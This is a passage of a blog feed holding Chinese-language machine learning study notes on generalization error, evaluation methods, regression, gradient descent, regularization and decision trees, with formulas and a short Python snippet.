        <content type="html"><![CDATA[<h2 id="经验误差与过拟合">经验误差与过拟合</h2><p>机器学习的目标：泛化误差小</p><ul><li>精度=1-错误率=1-错误样本数/总样本数</li><li>误差（error）：学习器的实际预测输出和样本的真实标记之间的差异</li><li>学习器在训练集上的误差称为“训练误差”（trainingerror）或“经验误差”（empirical error）</li><li>训练误差（traning error）：学习器在训练集上的误差，也称经验误差</li><li>泛化误差（generalizationerror）：在新样本上的误差。显然，我们希望得到泛化误差小的学习器。</li><li>测试误差（testing error）：用来<strong>近似</strong>泛化误差</li><li>模型选择（modelselection）问题：理想的解决方案当然是对候选模型的泛化误差进行评估，然后选择泛化误差最小的那个模型。</li><li>过拟合（Overfitting）：学习器将训练样本学的太好，将样本自身的一些特点当作了所有潜在样本都会具有的一般性质，导致泛化性能下降。<strong>过拟合无法避免只能缓解</strong></li><li>欠拟合（Underfitting）：学习器学习能力低下造成</li></ul><h2 id="评估方法">评估方法</h2><p>通常，我们可通过实验测试来对学习器的泛化误差进行评估并进而做出选择.为此，需使用一个“测试集”（testingset）来测试学习器对新样本的判别能力，然后以测试集上的“测试误差”（testingerror）作为泛化误差的近似.通常我们假设测试样本也是从样本真实分布中独立同分布采样而得，但需注意的是，测试集应该尽可能与训练集互斥，即**测试样本尽量不在训练集中出现、未在训练过程中使用过。</p><h2 id="测试集和训练集划分方法">测试集和训练集划分方法</h2><ol type="1"><li><p>留出法(hold-out) 直接将数据集 D 划分为两个互斥的集合</p><ul><li>保持数据分布的一致性，<strong>保持用于学习的数据集与用于测试的数据集的分布特征一致</strong>（例如：分层采样）</li><li>多次重复划分</li><li>测试集不能太大，也不能太小（一般 1/5 ～ 1/3）</li></ul></li><li><p>交叉验证法（cross validation） 先将数据集 D 划分为 k个大小相似的互斥子集,然后每次用 k-1个子集的并集作为训练集，余下的那个子集作为测试集；这样就可获得 k组训练/测试集，从而可进行 k 次训练和测试，最终返回的是这 k个测试结果的均值。为强调 k 的取值重要性，通常把交叉验证法称为“k折交叉验证”（k-fold crossvalidation）。k 最常用的取值是 10，此时称为 10折交叉验证；其他常用的 k 值有 5、20 等。</p><ul><li>留出法总归是使用了一部分数据，没有测试全部数据，因此 k折交叉验证就是解决这个问题。</li><li>假设将数据集分成 k = 10 份，第一次使用 D10 作为测试集，第二次使用 D9作为测试集，直至每个都当过测试集，然后将 k个结果求平均，就是最终结果。</li></ul></li><li><p>自助法（bootstrap ）</p><ul><li>基于”自助采样“的方法，也称：“有放回采样”、“可重复采样”</li><li>对数据集进行有放回采样，并且采样出的集合与原样本集同规模，但是数据分布有所改变</li></ul></li></ol><h2 id="调参与最终模型">调参与最终模型</h2><p>现实中常用的做法：对每个参数选定一个范围和变化步长，例如在[0，0.2]范围内以 0.05 为步长，则实际要评估的候选参数值有 5 个，最终是从这 5个候选值中产生选定值.这是在计算开销和性能估计之间进行折中的结果，通过这个折中，学习过程才变得可行。参数调得好不好往往对最终模型性能有关键性影响.</p><h3 id="性能度量">性能度量</h3><p>回归任务最常用的性能度量是“均方误差”（mean squared error）</p><p>分类任务中常用的性能度量：</p><ol type="1"><li><p>错误度与精度（accuracy） 错误率是分类错误的样本数占样本总数的比例精度则是分类正确的样本数占样本总数的比例</p></li><li><p>查准率（precision）与查全率（recall）查准率：在所预测类别中，预测正确的比例，分母是预测类别的样本数。例如：挑出的西瓜中，有多少比例是好瓜查全率：在真实类别中，预测正确的比例，分母是真实类别的样本数。例如：所有好瓜中有多少比例被挑了出来</p><p>对于二分类问题，可将样例根据其真实类别与学习器预测类别的组合划分为真正例（truepositive）、假正例（false positive）、真反例（truenegative）、假反例（false negative）四种情形，令 TP、FP、TN、FN分别表示其对应的样例数，则显然有TP+FP+TN+FN=样例总数。分类结果的“混淆矩阵”（confusion matrix）如下：<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16307367050186.jpg"alt="16307367050186" /></p><p><span class="math inline">\(P=\frac{T P}{T P+F P}\)</span> <spanclass="math inline">\(R=\frac{T P}{T P+F N}\)</span></p></li></ol><p>以查准率为纵轴、查全率为横轴作图，就得到了查准率-查全率曲线，简称 P-R曲线。</p><p><span class="math display">\[F1=\frac{2 \times P \times R}{P+R}=\frac{2 \times TP}{\text { 样例总数}+TP-TN}\]</span></p><p>F1 度量的一般形式 <span class="math inline">\(F_{\beta}\)</span>能让我们表达出对查准率/查全率的不同偏好。</p><p><span class="math display">\[F_{\beta}=\frac{\left(1+\beta^{2}\right)\times P \times R}{\left(\beta^{2} \times P\right)+R}\]</span></p><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://cs.nju.edu.cn/zhouzh/zhouzh.files/publication/MLbook2016.htm">周志华机器学习</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>机器学习概述</title>
      <link href="/blog/2021/07/15/ml/0.%20ml_intro/"/>
      <url>/blog/2021/07/15/ml/0.%20ml_intro/</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍机器学习的概念、分类与相关学习资料</p><h2 id="发展历史">发展历史</h2><ol type="1"><li><p><strong>machine learning</strong> as a "<strong>field ofstudy</strong> that gives computers the ability to learn without beingexplicitly programmed --Arthur Samuel</p></li><li><p><strong>Well-Posed Learning Problems</strong></p><p>A <strong>computer</strong> program is said to <strong>learn</strong>from experience E with respect to some class of tasks T and performancemeasure P, if its performance at tasks in T, as measured by P, improveswith experience E. --Tom Mitchell</p></li></ol><h3 id="alml-和-dl">AL、ML 和 DL</h3><p>AI is really a broad term and somewhat this also causes every companyto claim their product has AI these days. Then ML is a subset of AI, andconsists of the more advanced techniques and models that enablecomputers to figure things out from the data and deliver AIapplications. ML is the science of getting computers to act withoutbeing explicitly programmed.</p><p>Finally, DL is a newer area of ML that that uses multi-layeredartificial neural networks to deliver high accuracy in tasks such asobject detection, speech recognition, language translation and otherrecent breakthroughs that you hear in the news.</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/2021020816127886102281.png"alt="发展历程" /><figcaption aria-hidden="true">发展历程</figcaption></figure><h2 id="机器学习算法分类">机器学习算法分类</h2><p>根据训练数据是否拥有标记信息，学习任务可大致划分为两大类：“监督学习”（supervisedlearning）和“无监督学习”（unsupervisedlearning），分类和回归是前者的代表，而聚类则是后者的代表.</p><ol type="1"><li>Supervised learning Teach the computer how to do something</li><li>Unsupervised learning Let it learning by itself</li></ol><p>Others:</p><ul><li>Reinforcement learning</li><li>Recommender systems</li></ul><p>The classification of Supervised Learning and Unsupervised Learningare based on the forms of the data you get.</p><h3 id="supervised-learning">Supervised learning</h3><p>Give the algorithm a data set in which the "right answer" （label）were given. The task of the algorithm is to learn to produce more ofthis right answer througth learning the given data set.</p><p>给定有标签的数据集，通过它学习输入与输出的对应关系。就像刷题一样，自己做题，然后根据给的答案（label）来不断调整自己的方法和思路，最终作出正确答案。</p><p>监督学习目前使用较为广泛，主要分为两类：</p><ol type="1"><li><p>Regression problem</p><p>预测连续的输出值（例如：价格、高度、时间等）根据数据样本上抽取的特征，预测连续值结果，如：房价多少，得分多少，GDP多少</p><p>回归问题是在做计算题</p></li><li><p>Classification problem</p><p>预测<strong>离散</strong>的输出值（例如：对错、好坏、a、b 或 c 等）根据数据样本上抽取出的特征，判定其属于有限个类别中的哪一个，比如：垃圾邮件识别（结果类别：yesorno），文本情感褒贬识别（结果类别：褒、贬），图像内容识别（结果类别：猫，狗，人，其他）</p><p>分类问题是在做选择题</p><p>注: 逻辑回归实际上是分类问题</p></li></ol><h3 id="unsupervised-learning">Unsupervised learning</h3><p>We‘re given data that looks different, and doesn't havs any labels orthat all have the same label or really no labels. We expect the modelfind some structure in the data.</p><p>给定数据集，没有标签，通过程序自己去挖掘数据具有的特征，从而学得模型。</p><p>无监督学习主要以聚类问题为主</p><ol type="1"><li><p>Clustering algorithm</p><p>Break the data into some kinds of separate clusters (such as googlenew sort tons of informations into separate clusters、Organize computingclusters、Social network analysis、Market segmentation、Astronomicaldata analysis etc)</p><p>聚类算法：将数据分成几类，根据数据样本抽取出的特征，挖掘数据的关联、聚合模式。</p></li><li><p>Cocktail party problem</p><p>Separate the different things from different sources</p></li></ol><h3 id="semi-supervised-learning">Semi-Supervised Learning</h3><p>Semi-supervised learning falls between unsupervised learning (with nolabeled training data) and supervised learning (with only labeledtraining data). It combines a small amount of labeled data with a largeamount of unlabeled data during training.</p><h3 id="reinforcement-learning">Reinforcement learning</h3><p>强化学习是从环境到行为映射的学习，它研究基于环境而行动，以取得最大化的预期收益，例如：游戏如何得最高分，机器人完成任务。</p><h2 id="基本概念术语">基本概念术语</h2><p>下面以使用范围较广的监督学习为例子，介绍机器学习的概念</p><p>数据集</p><ul><li>训练集 有正确答案的，被标记的，用来学习，归纳的数据集。</li><li>测试集 没有正确答案的，没有标记的，用来测试模型的优劣的数据集。</li></ul><p>对于非监督学习，训练集和测试集就没与什么区别了，只是使用时的目的不一样而已。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16132680505121.jpg"alt="16132680505121" /><figcaption aria-hidden="true">16132680505121</figcaption></figure><p>上图中数据的每一行，叫做一个示例（instance）、样例（example）、样本（sample）</p><p>前三列每一列的表头叫做：属性（attribute）、特征（feature）</p><p>每个样本的每一列上的值叫做：属性值、特征值</p><p>所有的属性构成一个属性空间，所有的样本构成一个样本空间，输入‘X’可能取值的集合就是输入空间（inputspace）</p><p>属性向量：每一个属性有一个列向量，这些列向量构建: [x1,x2,..xn]成为一个特征向量</p><p>机器学习的整个流程：根据数据的类型，特点等，采用不同学习方法（监督与无监督）中不同的学习算法（learningalgorithm）来进行训练，从而得到一个模型，然后对这个模型进行测试，然后改进、迭代。</p><p>模型/假设(hypothesis)/学习器(learner):估计函数，对规律和模式的预测学习机（learner）：使用的学习算法 真相（ground-truth）：标签、标准答案样本（sample） =属性（attribute）/特征（feature）+标记/标签（label）</p><p>泛化能力：模型适用于新样本的能力，称为“泛化”（generalization）能力，具有强泛化能力的模型能很好地适用于整个样本空间，于是，尽管训练集通常只是样本空间的一个很小的采样，我们仍希望它能很好地反映出样本空间的特性。</p><p>归纳偏好：机器学习算法在学习过程中对某种类型假设的偏好，称为“归纳偏好”（inductivebias），或简称为“偏好” “奥卡姆剃刀”（Occam'srazor）是一种常用的、自然科学研究中最基本的原则，即“若有多个假设与观察一致，则选最简单的那个”</p><h2 id="书籍资料">书籍资料</h2><ol type="1"><li>Prof Andrew Ng Machine Learning. Stanford University</li><li>周志华，机器学习，清华大学出版社，2016</li><li>Python 数据分析与挖掘实战</li><li>面向机器智能的 tensorflow 实践</li><li>机器学习系统设计</li><li>tensorflow 技术解析与实战</li><li><ahref="http://scikit-learn.org/stable/index.html">Scikit-learn</a></li><li><ahref="https://developers.google.com/machine-learning/crash-course">GoogleCrash-Course</a></li></ol><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><a href="https://www.coursera.org/learn/machine-learning">MachineLearning by Stanford University | Coursera</a></li><li><ahref="https://cs.nju.edu.cn/zhouzh/zhouzh.files/publication/MLbook2016.htm">周志华机器学习</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>机器学习基本概念</title>
      <link href="/blog/2021/07/15/ml/1.intro_regression/"/>
      <url>/blog/2021/07/15/ml/1.intro_regression/</url>
      
        <content type="html"><![CDATA[<h2 id="机器学习machine-learning定义">机器学习（MachineLearning）定义</h2><p>机器学习的本质就是寻找一个函数 function，来寻找一个输入 input 与输出output 之间的映射关系。</p><h2 id="机器学习的应用">机器学习的应用</h2><table><colgroup><col style="width: 20%" /><col style="width: 37%" /><col style="width: 41%" /></colgroup><thead><tr class="header"><th>场景</th><th>函数/预测</th><th></th></tr></thead><tbody><tr class="odd"><td>Speech Recognition</td><td>f(一段语音)=文字</td><td>输入声音，输出语音内容</td></tr><tr class="even"><td>Image Recognition</td><td>f(图片)=对象</td><td>输入图像，输出图像对象的描述</td></tr><tr class="odd"><td>Playing Go</td><td>f(棋盘) = 下棋子的位置</td><td>下棋子的位置, 输出下一步棋 next move</td></tr><tr class="even"><td>Self-driving Car</td><td>f(各种传感器参数) = 方向盘角度</td><td>根据对道路以及路障的识别，得出方向</td></tr><tr class="odd"><td>Recommendation</td><td>f（使用者 A， 商品 B）=购买可能性</td><td>根据用户与商品的关系，得出购买可能性</td></tr></tbody></table><h2 id="基本概念">基本概念</h2><p>回归 regression：The function outputs a scalar(标量数值)</p><p>分类 classification：Give option(classes),the function outputs thecorrect one.</p><p>结构化学习 structures Learning：create something withstructure(image,document). 函数输出是以某种结构形式。</p><p>打个比喻，如果用一张数学试卷来描述，分类是给定选项的，像判断题就是二分类问题，研究对象是不是这个类的问题，而选择题就是多分类问题，有多个类别选择一个类别；回归更像是简答题，你的自己算出标量值；而结构化学习可以是一整张试卷，也可以是试卷的所有选择题或所有简答题。那如果是多选题呢？多个选项多个正确答案，例如一张栀子花图片（图从百度上借来），它既属于花类，也属于栀子花类。其实也没事，设置多标签multi-label。</p><h2 id="how-to-find-function">How to find Function?</h2><p>Case Study</p><h3 id="function-with-unknown-parameters">Function with unknownParameters</h3><p>模型学习的三步骤：建立模型、定义损失函数、优化参数</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422004647.png"alt="20220422004647" /><figcaption aria-hidden="true">20220422004647</figcaption></figure><ol type="1"><li>根据 domain knowledge<a href="#fn1" class="footnote-ref" id="fnref1"role="doc-noteref"><sup>1</sup></a>，猜测一个能完成任务的未知函数</li><li>根据训练数据，定义 loss 函数，用来衡量函数解和真实情况的差距。</li><li>通过不断优化，找到能使 loss值最小的参数，也就是使函数解尽可能接近真实情况。</li></ol><p>这三步都属于 training 过程。最后 train出来的参数能使模型预测最准，将这个模型用于预测没有看过的资料的过程叫做testing，一般 testing 的 loss 会比 training 的 loss 高。</p><h4 id="regression回归">Regression（回归）</h4><p>下面以预测 YouTube频道次日流量为例，讲一个回归任务的流程。基于后台资讯（domainknowledge），我们猜测一个带有未知数的模型。y 是预测的观看量；x1是今天的观看量，称为 feature（自变量）；w 和 b就是模型参数，需要学习之后确定下来。</p><ol type="1"><li><p>第一步：建立一个含有未知参数的函数，从而规定一类函数集合，这个函数就是机器学习里的模型model。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220421230745.png"alt="20220421230745" /> 根据 domain knowledge<a href="#fn2"class="footnote-ref" id="fnref2"role="doc-noteref"><sup>2</sup></a>，猜测一个能完成任务的未知函数。在这里我们猜测：<spanclass="math inline">\(y=b+w*x_1\)</span>。<spanclass="math inline">\(x\)</span> 是已知的特征 feature，<spanclass="math inline">\(w\)</span> 为权重 weight，<spanclass="math inline">\(b\)</span> 是偏置 bias, <spanclass="math inline">\(w\)</span>和<spanclass="math inline">\(b\)</span>都是未知的参数，需要从数据中学习。</p></li><li><p>Define loss from Training data</p><p>要评价 function/model 的好坏，就需要定义评估 model的函数，即定义损失（loss）函数，计算 model在所有样本点上的损失总和。<strong>Loss是关于未知参数的函数</strong>，每一对未知参数的具体值 <spanclass="math inline">\((w_1, b_1)\)</span>，对应一个预测模型，Loss函数即是评估该预测模型和真实模型(训练数据)的拟合程度(损失/差值)。从而通过变换<span class="math inline">\(w\)</span> 和 <spanclass="math inline">\(b\)</span> 最小化 Loss值，就是不断调整预测模型来拟合训练数据。评价一个预测模型的好坏，即：对每一个训练样本，计算其模型输出与真实值（label）之间的误差（e），也就是损失，整个模型的损失函数就是全部训练样本误差的平均值。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220421233122.png"alt="20220421233122" /><figcaption aria-hidden="true">20220421233122</figcaption></figure><p>loss 常用的评估方式有：</p><ul><li><p>MAE(mean absolute error) 平均绝对误差</p></li><li><p>MSE（mean square error） 均方误差</p></li><li><p>cross-Entropy 交叉熵</p><p>If y and are both probability distributions，则选择Cross-entropy</p></li></ul><p>Error Surface 误差曲面：绘制出参数作为横、纵坐标和 L之间的映射关系，就形成了二维的误差面，颜色代表 loss 的大小。 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220421234522.png"alt="20220421234522" /></p></li><li><p>Optimization</p></li></ol><p>优化的目标是找到使 Loss 最小的参数，即求解<spanclass="math inline">\(w^{*}, b^{*}=\underset{w, b}{\arg \min }L\)</span></p><p>优化方法：梯度下降 gradient descend</p><p>一、以一个参数 <span class="math inline">\(w\)</span>举例，画出其对应的 error surface</p><pre><code>下面例子中先不看参数 b，只观察参数 w。梯度下降的做法是先随机初始化一个 w0，然后计算 w0 处的微分，可理解为斜率。当微分为负数时，在 w0 处，loss 关于 w 递减，所以增大 w 使 loss 下降。当微分为正数时，在 w0 处，loss 关于 w 递增，所以减小 w 使 loss 下降。![20220422003305](https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422003305.png)先随便选个 $w$，然后计算它的梯度（也就是斜率），当梯度为负时就应增大 $w$。增大 x 的幅度（步长）由学习率 learning rate 和斜率决定。学习率是一个需要提前设定的超参数 hyperparameter（相比超参而言，$w$和 $b$ 这种参数是要通过数据学习的）如此迭代多次更新 $w$（停止条件：迭代次数达到阈值（超参）或微分趋于 0）,梯度下降的问题在于只能找到局部最小值（但其实这是个假问题，将在后面课程中解释）![20220422003846](https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422003846.png)</code></pre><p>二、推广到两个参数的例子：随机选取初始参数，计算其偏微分，使用梯度下降的方式同时更新两个参数，多次迭代直至停止。</p><pre><code>![20220422004135](https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422004135.png)![20220422004234](https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422004234.png)</code></pre><ol start="4" type="1"><li><p>测试</p><p>通过训练阶段得到 <span class="math inline">\(w^{*}=0.97, b^{*}=0.1k\)</span> ，训练集上的损失函数 <spanclass="math inline">\(L\left(w^{*}, b^{*}\right)=0.48 k\)</span>，测试集上的损失函数 <span class="math inline">\(L^{\prime}=0.58k\)</span> a <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422004748.png"alt="20220422004748" />通过上图真实值和拟合值对比，可以看出数据有明显的周期性，因此修改自变量为前j 日的流量。拟合 1 日、7 日、28 日、56日的数据来预测下一日流量。可以发现随着自变量日期增加，在测试集上的结果不再变好。<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422004852.png"alt="20220422004852" /></p></li></ol><p>常用优化方法有 Adam、梯度下降（Gradient Descent）等。</p><h2 id="扩展">扩展</h2><h2 id="参考">参考</h2><p><ahref="https://www.zippia.com/advice/domain-knowledge/#:~:text=Domain%20knowledge%20is%20defined%20as,experts%20in%20a%20particular%20field.">DomainKnowledge: What Is It And Examples – Zippia</a></p><aside id="footnotes" class="footnotes footnotes-end-of-document"role="doc-endnotes"><hr /><ol><li id="fn1"><p>Domain knowledge is defined as the knowledge of aspecific, specialized discipline, profession, or activity, in contrastto general knowledge. In other words, the term domain knowledge is usedto describe the knowledge of specialists or experts in a particularfield.<a href="#fnref1" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn2"><p>Domain knowledge is defined as the knowledge of aspecific, specialized discipline, profession, or activity, in contrastto general knowledge. In other words, the term domain knowledge is usedto describe the knowledge of specialists or experts in a particularfield.<a href="#fnref2" class="footnote-back"role="doc-backlink">↩︎</a></p></li></ol></aside>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>模型选择-过拟合与正则化</title>
      <link href="/blog/2021/07/15/ml/2.model_selection/"/>
      <url>/blog/2021/07/15/ml/2.model_selection/</url>
      
        <content type="html"><![CDATA[<h2 id="intro">intro</h2><p>如果第一轮模型拟合效果不好，凭借 domain knowledge对结果的分析，可能对初始模型猜测不恰当或者对其他影响因素缺乏考虑，需要重新设计模型。</p><p>回归问题的损失函数是凸函数（convex），意味着一定会找到全局最优解。但是，其它的机器学习问题中，多个参数的梯度下降可能会陷入局部最优解。</p><p>选择模型时，更倾向于选择“平滑”的模型。因为当数据有噪声干扰时，越平滑的函数受到噪声的干扰越小。</p><h2 id="过拟合">过拟合</h2><p>越复杂的模型拥有更大的函数集合空间，理论上经过训练都可以得到好的预测能力，但是取决于梯度下降的是否能找到了local minima. 事实上， A more complex model does not always lead tobetter performance on testing data.This is<strong>Overfitting</strong>.</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422103934.png"alt="20220422103934" /><figcaption aria-hidden="true">20220422103934</figcaption></figure><p>可以看到在测试集中，随着模型复杂化，前面误差在减小，但是后面模型越复杂，测试集误差越大。越复杂的模型不一定在测试集中有更好的结果。这种现象就是过拟合。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422104209.png"alt="20220422104209" /><figcaption aria-hidden="true">20220422104209</figcaption></figure><p>过拟合的一个解决方法是使用正则化，通过正则化来降低模型的泛化误差。</p><h2 id="正则化">正则化</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422104404.png"alt="20220422104404" /><figcaption aria-hidden="true">20220422104404</figcaption></figure><p>最初的 Loss 函数采用 square error，只考虑了 Prediction 的 errorregularization 主要是加上一项额外的 term，这项额外的 term: <spanclass="math display">\[\lambda\sum_{\circ}\left(w_{i}\right)^{2}\]</span>（<spanclass="math inline">\(lambda\)</span> 为超参数）</p><p>正则项的意义：<span class="math inline">\(w_i\)</span>越小，该项越小，Loss 越小。 参数 <spanclass="math inline">\(w_i\)</span> 偏小，函数更平滑，函数值随 x变化的变化幅度小， 即：<span class="math inline">\(w_i\Delta{x}\)</span>越小。因此，在噪声影响输入时，平滑函数受到噪声的影响更小。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422111202.png"alt="20220422111202" /><figcaption aria-hidden="true">20220422111202</figcaption></figure><p>通过调整 <span class="math inline">\(\lambda\)</span>超参数，得结果如下： <span class="math inline">\(\lambda\)</span>越大，function is more smoother，但是在训练集上的误差越大，因为 <spanclass="math inline">\(\lambda\)</span>我们对正则项的考虑越多，对拟合的误差项考虑越少。但是 <spanclass="math inline">\(\lambda\)</span>越大，在测试集上的误差从小到大，说明一定范围内更平滑的函数可以抵抗噪声，但是太过平滑的function，拟合效果过差。因此我们需要选择调整 <spanclass="math inline">\(\lambda\)</span> 获得使 loss 最小的模型。</p><p>注意：正则化不需要考虑 bias（b），因为 bias对函数的平滑程度没有贡献，它仅仅是上下移动 function 而已。</p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>梯度下降</title>
      <link href="/blog/2021/07/15/ml/4.gradient_descent/"/>
      <url>/blog/2021/07/15/ml/4.gradient_descent/</url>
      
        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>求解线性回归模型函数求极值 解析解根据严格的推导和计算得到，是方程的精确解能够在任意精度下满足方程 数值解通过某种近似计算得到的解 能够在给定的精度下满足方程常用的求数值解的方法：梯度下降法</p><p>一元凸函数求极值 对于迭代法来说：</p><ol type="1"><li>步长过小，迭代次数过多，收敛慢</li><li>步长过大，产生震荡 overshoot the minimum（更新 x时，步长太大，跨越了最小值） 震荡：1. 来回震荡，振幅越来越小，最终收敛2. 来回震荡，无法收敛</li></ol><p>让步长和斜率之间保持正比例关系, <spanclass="math inline">\(\eta\)</span> 是一个常数，称为学习率 <spanclass="math inline">\(step = \eta\frac{df(x)}{dx}\)</span></p><p>超参数：在开始学习之前设置，不是通过训练得到的，学习率就是一个超参数。</p><p>选择一组好的超参数，可以提高学习的性能和效果。</p><p>第 k+1 轮迭代和第 k 轮迭代的关系式：<spanclass="math inline">\(x^{(k+1)}=x^{(k)}-\eta\frac{df(x)}{dx}\)</span></p><p>优点：</p><ol type="1"><li>自动调节步长</li><li>自动确定下一次更新的方向</li><li>保证收敛性</li></ol><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154310451785.jpg"alt="16154310451785" /> 梯度</p><ol type="1"><li>模为方向导数的最大值</li><li>方向为取得最大方向导数的方向</li></ol><p>只要能够把<strong>损失函数</strong>描述成<strong>凸函数</strong>，那么就一定可以采用<strong>梯度下降法</strong>，以<strong>最快</strong>的速度更新<strong>权值向量w</strong>，找到使损失函数达到<strong>最小值点</strong>的位置。</p><h2 id="一元线性回归">一元线性回归</h2><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154312967312.jpg"alt="16154312967312" /> 首先，判断一元线性回归的 Loss为凸函数，然后采用梯度下降法。 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154314178291.jpg"alt="16154314178291" /></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154323224457.jpg"alt="16154323224457" /><figcaption aria-hidden="true">16154323224457</figcaption></figure><p>步骤：</p><ol type="1"><li>加载样本数据 x，y</li><li>设置超参数：学习率，迭代次数根据经验反复尝试，同时观察算法是否收敛，并达到我们的要求。</li><li>设置模型参数初值 Wo，bo</li><li>训练模型 w，b</li><li>结果可视化</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置超参数</span></span><br><span class="line">learn_rate = <span class="number">0.00001</span>  <span class="comment"># 通常是一个很小的常数</span></span><br><span class="line"><span class="built_in">iter</span> = <span class="number">100</span>  <span class="comment"># 迭代次数</span></span><br><span class="line"></span><br><span class="line">display_step = <span class="number">10</span>  <span class="comment"># 输出结果的间隔，它不属于超参数，因为其取值完全不影响模型训练,只是改变显示的效果</span></span><br></pre></td></tr></table></figure><p>在线性回归中,初始值的选择并没有那么重要,通常情况下我们将其设置为 0即可.</p><h2 id="多元线性回归">多元线性回归</h2><h3 id="归一化标准化">归一化/标准化</h3><p>归一化/标准化：将数据的值限制在一定的范围之内使所有属性处于同一个范围、同一个数量级下更快收敛到最优解提高学习器的精度 分为：线性归一化，标准差归一化，非线性映射归一化</p><ol type="1"><li>线性归一化：对原始数据的线性变换 <span class="math inline">\(x^{*}=\frac{x-min}{max-min}\)</span> 等比例缩放所有的数据都被映射到[0，1]之间</li><li>标准差归一化：将数据集归一化为<strong>均值为 0，方差为 1</strong>的标准正态分布 <span class="math inline">\(x^*=\frac{x一\mu}{\sigma}\)</span></li><li>非线性映射归一化：对原始数据的非线性变换 指数、对数、正切</li></ol><h3id="使用梯度下降法求解多元线性回归">使用梯度下降法求解多元线性回归</h3><ol type="1"><li>加载样本数据 area，room，price</li><li>数据处理 归一化，X，Y</li><li>设置超参数：学习率，迭代次数</li><li>设置模型参数初值 Wo(wo，w1，w2)</li><li>训练模型 W <span class="math inline">\(W^{k+1} = W^{k}-\etaX^{T}(XW-Y)\)</span> <span class="math display">\[\begin{aligned}\frac{\partial \text { Loss }}{\partial W} &amp;=X^{T}(X W-Y) \\W^{(k+1)} &amp;=W^{(k)}-\eta \frac{\partial\operatorname{Loss}(W)}{\partial W}\end{aligned}\]</span></li><li>结果可视化 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154428462423.jpg"alt="16154428462423" /></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>西瓜书第四章-决策树</title>
      <link href="/blog/2021/07/15/ml/decision_tree/"/>
      <url>/blog/2021/07/15/ml/decision_tree/</url>
      
        <content type="html"><![CDATA[<h1 id="西瓜书第四章">西瓜书第四章</h1><h2 id="基本流程">基本流程</h2><p>决策树的每一个叶子结点表示一个决策结果，每个中间节点表示一个属性测试。</p><p>学习目的为生成一颗泛化能力强的决策树（处理未见示例能力强）</p><p>决策树学习的基本过程是递归下降的划分过程，节点对给定的数据集和属性集学习并得到一个划分或者将自己标记为叶子结点。</p><h2 id="划分选择">划分选择</h2><p>决策树学习的关键步骤在于选择合适的最优划分属性。</p><h3 id="信息增益">信息增益</h3><p>使用信息熵（频率负对数的期望）来度量样本集合纯度。</p><p>𝐸𝑛𝑡(𝐷)=−∑|𝑦|𝑘=1𝑝𝑘𝑙𝑜𝑔2𝑝𝑘 值越小表示样本集合 D 的纯度越高。</p><p>定义信息增益，度量使用属性 a对样本进行划分后的性能提升。其中划分后的值为各个子节点的信息熵的加权和。</p><p>𝐺𝑎𝑖𝑛(𝐷,𝑎)=𝐸𝑛𝑡(𝐷)−∑𝑉𝑣=1|𝐷𝑣||𝐷|𝐸𝑛𝑡(𝐷𝑣)值越大表示提升越多。</p><p>每一次划分时，选择信息增益最大的属性用于划分。</p><h3 id="增益率">增益率</h3><p>信息增益准则对于可选择值数目更多的属性有所偏好，使用增益率选择划分属性可减少其不利影响</p><p>𝐺𝑎𝑖𝑛𝑟𝑎𝑡𝑖𝑜(𝐷,𝑎)=𝐺𝑎𝑖𝑛(𝐷,𝑎)𝐼𝑉(𝑎) 其中定义了属性的固有值</p><p>𝐼𝑉(𝑎)=−∑𝑉𝑣=1|𝐷𝑣||𝐷|𝑙𝑜𝑔2|𝐷𝑣||𝐷|用来减少取值数目的影响，但是对取值数目较少的属性有所偏好</p><p>折衷：先选出信息增益高于平均水平的属性，再从中选择增益率最高的</p><h3 id="基尼指数">基尼指数</h3><p>CART 算法定义基尼指数用于度量数据集的纯度</p><p>𝐺𝑖𝑛𝑖(𝐷)=1−∑[𝑌]𝑘=1𝑝2𝑘 